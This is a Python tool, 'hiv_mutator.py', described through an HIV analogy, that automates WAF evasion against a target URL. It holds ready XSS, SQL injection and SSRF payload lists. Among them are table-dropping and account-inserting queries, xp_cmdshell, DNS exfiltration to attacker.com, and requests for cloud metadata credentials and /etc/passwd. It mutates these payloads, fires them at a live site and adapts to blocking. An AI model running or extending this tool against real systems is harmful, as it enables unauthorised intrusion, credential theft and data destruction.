#!/usr/bin/env python3
"""
hiv_mutator.py — Polymorphic Payload Mutation Engine

HIV Analogy:
    Like the HIV virus that mutates its surface proteins (gp120/gp41) to evade
    immune system detection, this engine continuously mutates attack payloads to
    evade WAF signature matching. Each 'round' is a replication cycle where
    mutations are selected based on what survived the last immune response (WAF).
    The history tracking mimics HIV's ability to 'remember' what immune responses
    it has already triggered, avoiding re-exposure to destroyed mutations.

Usage:
    python hiv_mutator.py --target URL --param PARAM --type xss|sqli|ssrf --rounds 50
"""

import argparse
import random
import time
import urllib.parse
import urllib.request
import urllib.error
import json
import sys
import re
import string
import hashlib
from collections import defaultdict


# ---------------------------------------------------------------------------
# XSS Vector Library (30+ variants across all HTML contexts)
# ---------------------------------------------------------------------------
XSS_VECTORS = [
    # Basic script injection
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<script src=data:,alert(1)></script>",
    # Attribute event handlers
    "\"><img src=x onerror=alert(1)>",
    "' onmouseover='alert(1)",
    "\" onload=\"alert(1)\"",
    "`onmouseover=alert(1)`",
    # HTML5 event handlers
    "<svg onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    # SVG-based (CSP bypass)
    "<svg><script>alert(1)</script></svg>",
    "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    # Math + style combo (mXSS)
    "<math><style><img src=x onerror=alert(1)></style></math>",
    "<svg><style><img src=x onerror=alert(1)></style></svg>",
    # Template injection / Angular
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "#{alert(1)}",
    # JavaScript URL context
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    "javascript://%0aalert(1)",
    "javascript\u0000:alert(1)",
    # Obfuscated payloads
    "<svg onload=eval(atob('YWxlcnQoMSk='))>",
    "<script>ale\\u0072t(1)</script>",
    "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
    # DOM-based sinks
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<iframe src=\"javascript:alert(1)\">",
    # Data URI
    "<object data=\"data:text/html,<script>alert(1)</script>\">",
    # Link-based
    "<a href=\"javascript:alert(1)\">click</a>",
    # CSS injection
    "<style>body{background:url('javascript:alert(1)')}</style>",
    # Polyglot
    "'\"><svg/onload=alert(1)//",
]


# ---------------------------------------------------------------------------
# SQLi Vector Library (25+ variants: boolean, time, error, OOB, stacked)
# ---------------------------------------------------------------------------
SQLI_VECTORS = [
    # Error-based probes
    "'",
    "''",
    "`",
    "')",
    "\"))",
    # Boolean-based
    "' OR 1=1--",
    "' OR '1'='1",
    "' AND 1=1--",
    "' AND 1=2--",
    "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' OR 'x'='x",
    # UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,database(),3--",
    "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
    # Time-based blind (MySQL)
    "' AND SLEEP(5)--",
    "1; SELECT SLEEP(5)--",
    "' OR SLEEP(5)#",
    # Time-based blind (PostgreSQL)
    "'; SELECT pg_sleep(5)--",
    "1 AND (SELECT 1 FROM pg_sleep(5))--",
    # Time-based blind (MSSQL)
    "'; WAITFOR DELAY '0:0:5'--",
    "1; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--",
    # Stacked queries
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES ('attacker','pass')--",
    # OOB (DNS-based)
    "' UNION SELECT LOAD_FILE(concat('\\\\\\\\',version(),'.attacker.com\\\\x'))--",
    "'; EXEC master..xp_dirtree '//attacker.com/x'--",
    # Error-based extraction
    "' AND extractvalue(1,concat(0x7e,database()))--",
    "' AND updatexml(1,concat(0x7e,database()),1)--",
]


# ---------------------------------------------------------------------------
# SSRF Bypass Library (20+ IP representation variants)
# ---------------------------------------------------------------------------
SSRF_VECTORS = [
    # Standard
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    # Decimal encoding
    "http://2852039166/latest/meta-data/",
    # Hex encoding
    "http://0xa9fea9fe/latest/meta-data/",
    "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/",
    # Octal encoding
    "http://0251.0376.0251.0376/latest/meta-data/",
    # Mixed encoding
    "http://169.254.0xa9fe/latest/meta-data/",
    # URL encoding
    "http://169.254.169.254%2flatest%2fmeta-data%2f",
    # IPv6
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
    # Localhost variants
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://0177.0.0.01/",
    "http://0x7f.0.0.1/",
    # DNS rebinding / special
    "http://nip.io/169.254.169.254",
    "http://169.254.169.254.nip.io/latest/meta-data/",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure IMDS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Protocol variations
    "file:///etc/passwd",
    "dict://169.254.169.254:80/",
    "gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.0%0d%0a",
]


# ---------------------------------------------------------------------------
# Mutation Engine
# ---------------------------------------------------------------------------
class MutationEngine:
    """
    HIV Analogy — Reverse Transcriptase:
        Like HIV's error-prone reverse transcriptase that introduces random
        mutations during DNA synthesis (creating genetic diversity that some
        variants evade immune detection), MutationEngine applies layered
        transformations to payloads, generating diverse variants that may
        evade specific WAF signature patterns.
    """

    def __init__(self):
        self._history = set()

    # --- 12 mutation strategies ---

    def url_encode(self, payload: str) -> str:
        """URL-encode special characters."""
        return urllib.parse.quote(payload, safe='')

    def double_url(self, payload: str) -> str:
        """Double URL-encode the payload."""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

    def unicode_escape(self, payload: str) -> str:
        """Replace alphabetic chars with unicode escapes."""
        result = []
        for ch in payload:
            if ch.isalpha() and random.random() < 0.4:
                result.append('\\u{:04x}'.format(ord(ch)))
            else:
                result.append(ch)
        return ''.join(result)

    def html_entity(self, payload: str) -> str:
        """Replace chars with HTML decimal entities."""
        result = []
        for ch in payload:
            if ch in '<>"\'&' or (ch.isalpha() and random.random() < 0.3):
                result.append('&#{};'.format(ord(ch)))
            else:
                result.append(ch)
        return ''.join(result)

    def case_randomize(self, payload: str) -> str:
        """Randomly swap case of alpha characters."""
        return ''.join(
            ch.upper() if random.random() > 0.5 else ch.lower()
            for ch in payload
        )

    def comment_inject(self, payload: str) -> str:
        """Inject SQL/HTML comments into keywords."""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR',
                    'script', 'alert', 'onerror', 'onload']
        result = payload
        for kw in keywords:
            if kw.lower() in result.lower():
                idx = result.lower().find(kw.lower())
                mid = len(kw) // 2
                comment = '/**/' if random.random() > 0.5 else '/*!*/'
                result = (result[:idx + mid] + comment +
                          result[idx + mid:])
        return result

    def whitespace_sub(self, payload: str) -> str:
        """Replace spaces with alternative whitespace."""
        alts = ['%09', '%0a', '%0d', '/**/', '+', '%20']
        return payload.replace(' ', random.choice(alts))

    def null_byte(self, payload: str) -> str:
        """Inject null bytes to confuse parsers (legacy technique)."""
        result = list(payload)
        pos = random.randint(1, max(1, len(result) - 1))
        result.insert(pos, '%00')
        return ''.join(result)

    def param_pollution(self, payload: str) -> str:
        """HTTP parameter pollution wrapper — duplicates value."""
        # Returns a marker that the campaign runner can split into two params
        return payload + '&__hiv_dup__=' + urllib.parse.quote(payload[:20])

    def chunked_delivery(self, payload: str) -> str:
        """Split payload across multiple lines (for multi-value headers)."""
        mid = len(payload) // 2
        return payload[:mid] + '\r\n ' + payload[mid:]

    def charset_confusion(self, payload: str) -> str:
        """Encode payload using UTF-7 / Latin-1 lookalikes."""
        charset_map = {
            'a': '\u0430', 'e': '\u0435', 'o': '\u043e',
            'p': '\u0440', 'c': '\u0441', 'x': '\u0445',
        }
        return ''.join(charset_map.get(ch, ch) for ch in payload)

    def order_shuffle(self, payload: str) -> str:
        """Shuffle attribute order in HTML tags."""
        # E.g. <img src=x onerror=...> → <img onerror=... src=x>
        tag_match = re.match(r'(<\w+)(.*?)(>)', payload, re.DOTALL)
        if tag_match:
            tag_open = tag_match.group(1)
            attrs_str = tag_match.group(2)
            tag_close = tag_match.group(3)
            attrs = attrs_str.split()
            random.shuffle(attrs)
            return tag_open + ' ' + ' '.join(attrs) + tag_close
        return payload

    def get_all_strategies(self):
        return [
            self.url_encode, self.double_url, self.unicode_escape,
            self.html_entity, self.case_randomize, self.comment_inject,
            self.whitespace_sub, self.null_byte, self.param_pollution,
            self.chunked_delivery, self.charset_confusion, self.order_shuffle,
        ]

    def mutate(self, payload: str, n_mutations: int = 2) -> str:
        """Apply n random mutation strategies to a payload."""
        strategies = random.sample(self.get_all_strategies(),
                                   min(n_mutations, len(self.get_all_strategies())))
        result = payload
        for strategy in strategies:
            try:
                result = strategy(result)
            except Exception:
                pass
        return result

    def is_seen(self, payload: str) -> bool:
        h = hashlib.sha256(payload.encode()).hexdigest()
        if h in self._history:
            return True
        self._history.add(h)
        return False

    def fresh_mutant(self, base_vectors: list, max_attempts: int = 20) -> str:
        """Generate a payload mutation that hasn't been sent before."""
        for _ in range(max_attempts):
            base = random.choice(base_vectors)
            mutated = self.mutate(base, n_mutations=random.randint(1, 3))
            if not self.is_seen(mutated):
                return mutated
        # Fallback: always-novel via timestamp suffix
        base = random.choice(base_vectors)
        return base + '<!--' + str(time.time()) + '-->'


# ---------------------------------------------------------------------------
# Response Analyser
# ---------------------------------------------------------------------------
class ResponseAnalyser:
    """
    HIV Analogy — T-Cell Counting:
        Like how HIV monitors CD4+ T-cell counts to gauge immune suppression
        (low count = favourable environment to replicate), the analyser measures
        WAF 'immune strength' from HTTP responses to guide mutation selection.
    """

    def analyse(self, status: int, body: str, elapsed: float) -> dict:
        result = {
            'status': status,
            'elapsed': elapsed,
            'blocked': False,
            'waf_signal': None,
            'recommendation': None,
        }
        if status in (403, 406, 429, 503):
            result['blocked'] = True
            result['waf_signal'] = 'hard_block'
            result['recommendation'] = 'increase_obfuscation'
        elif status == 400:
            result['waf_signal'] = 'syntax_block'
            result['recommendation'] = 'try_encoding'
        elif status == 200:
            # Check for WAF challenge pages
            waf_patterns = [
                'access denied', 'blocked', 'incapsula',
                'cloudflare', 'mod_security', 'firewall',
            ]
            body_lower = body.lower()
            for pat in waf_patterns:
                if pat in body_lower:
                    result['blocked'] = True
                    result['waf_signal'] = 'challenge_page'
                    result['recommendation'] = 'switch_strategy'
                    break
            if not result['blocked']:
                result['waf_signal'] = 'pass'
                result['recommendation'] = 'escalate'
        elif status == 500:
            result['waf_signal'] = 'error_leak'
            result['recommendation'] = 'exploit_error'
        elif elapsed > 4.5:
            result['waf_signal'] = 'time_based_hit'
            result['recommendation'] = 'exploit_timing'
        return result


# ---------------------------------------------------------------------------
# Adaptive Campaign Runner
# ---------------------------------------------------------------------------
class CampaignRunner:
    """
    HIV Analogy — Viral Replication Campaign:
        Like an HIV infection cycle: enter host cell → replicate → release
        new virions → infect adjacent cells. The campaign runner 'enters'
        the target with an initial probe, analyses the immune (WAF) response,
        selects surviving mutation strategies, and 'releases' the next wave.
    """

    def __init__(self, target: str, param: str, payload_type: str,
                 rounds: int = 50, timeout: int = 10):
        self.target = target
        self.param = param
        self.payload_type = payload_type
        self.rounds = rounds
        self.timeout = timeout
        self.engine = MutationEngine()
        self.analyser = ResponseAnalyser()
        self.results = []
        self.strategy_scores = defaultdict(int)

    def _get_vectors(self):
        if self.payload_type == 'xss':
            return XSS_VECTORS
        elif self.payload_type == 'sqli':
            return SQLI_VECTORS
        elif self.payload_type == 'ssrf':
            return SSRF_VECTORS
        else:
            return XSS_VECTORS + SQLI_VECTORS

    def _send_probe(self, payload: str) -> tuple:
        """Send a single probe and return (status, body, elapsed)."""
        try:
            encoded = urllib.parse.urlencode({self.param: payload})
            sep = '&' if '?' in self.target else '?'
            url = self.target + sep + encoded
            req = urllib.request.Request(url)
            req.add_header('User-Agent', self._random_ua())
            start = time.time()
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                body = resp.read(4096).decode('utf-8', errors='replace')
                elapsed = time.time() - start
                return resp.status, body, elapsed
        except urllib.error.HTTPError as e:
            return e.code, '', time.time() - start if 'start' in dir() else 0
        except Exception as e:
            return 0, str(e), 0

    def _random_ua(self) -> str:
        uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'curl/7.88.1',
            'python-requests/2.31.0',
        ]
        return random.choice(uas)

    def _select_mutation_count(self, last_analysis: dict) -> int:
        if last_analysis and last_analysis.get('blocked'):
            return random.randint(2, 4)
        return random.randint(1, 2)

    def run(self):
        vectors = self._get_vectors()
        last_analysis = {}
        print(f"[HIV-MUTATOR] Starting campaign: {self.payload_type.upper()} "
              f"→ {self.target} [{self.rounds} rounds]")
        print("-" * 60)

        for rnd in range(1, self.rounds + 1):
            n_mut = self._select_mutation_count(last_analysis)
            payload = self.engine.fresh_mutant(vectors, max_attempts=30)
            # Apply extra mutations if last probe was blocked
            if last_analysis.get('blocked'):
                payload = self.engine.mutate(payload, n_mutations=n_mut)

            status, body, elapsed = self._send_probe(payload)
            analysis = self.analyser.analyse(status, body, elapsed)
            last_analysis = analysis

            result_entry = {
                'round': rnd,
                'payload': payload[:120],
                'status': status,
                'elapsed': round(elapsed, 3),
                'waf_signal': analysis['waf_signal'],
                'blocked': analysis['blocked'],
                'recommendation': analysis['recommendation'],
            }
            self.results.append(result_entry)

            status_icon = '✓' if not analysis['blocked'] else '✗'
            print(f"  [{rnd:3d}] {status_icon} HTTP {status} | "
                  f"{elapsed:.2f}s | {analysis['waf_signal']} | "
                  f"{payload[:60]}...")

            # Adaptive sleep: back off if getting blocked
            if analysis['blocked']:
                time.sleep(random.uniform(1.0, 3.0))
            else:
                time.sleep(random.uniform(0.1, 0.5))

        self._print_summary()

    def _print_summary(self):
        total = len(self.results)
        passed = sum(1 for r in self.results if not r['blocked'])
        timing_hits = sum(1 for r in self.results if r['waf_signal'] == 'time_based_hit')
        error_leaks = sum(1 for r in self.results if r['waf_signal'] == 'error_leak')

        print("\n" + "=" * 60)
        print("[HIV-MUTATOR] Campaign Summary")
        print("=" * 60)
        print(f"  Total rounds     : {total}")
        print(f"  WAF bypassed (2xx no challenge) : {passed} "
              f"({100*passed//total if total else 0}%)")
        print(f"  Timing hits (SQLi blind)        : {timing_hits}")
        print(f"  Error leaks (500)               : {error_leaks}")
        print(f"  Unique payloads tested          : {len(self.engine._history)}")

        # Save results
        out_file = 'hiv_mutator_results.json'
        with open(out_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n  Results saved → {out_file}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description='HIV Mutator — Polymorphic Payload Mutation Engine',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument('--target', required=True, help='Target URL')
    parser.add_argument('--param', required=True, help='Vulnerable parameter name')
    parser.add_argument('--type', required=True, choices=['xss', 'sqli', 'ssrf'],
                        help='Payload type')
    parser.add_argument('--rounds', type=int, default=50,
                        help='Number of mutation rounds (default: 50)')
    parser.add_argument('--timeout', type=int, default=10,
                        help='HTTP request timeout in seconds (default: 10)')
    parser.add_argument('--list-payloads', action='store_true',
                        help='List all base payloads and exit')
    args = parser.parse_args()

    if args.list_payloads:
        libraries = {'xss': XSS_VECTORS, 'sqli': SQLI_VECTORS, 'ssrf': SSRF_VECTORS}
        lib = libraries[args.type]
        print(f"\n[{args.type.upper()} Base Vectors — {len(lib)} total]")
        for i, v in enumerate(lib, 1):
            print(f"  {i:3d}. {v}")
        sys.exit(0)

    runner = CampaignRunner(
        target=args.target,
        param=args.param,
        payload_type=args.type,
        rounds=args.rounds,
        timeout=args.timeout,
    )
    runner.run()


if __name__ == '__main__':
    main()
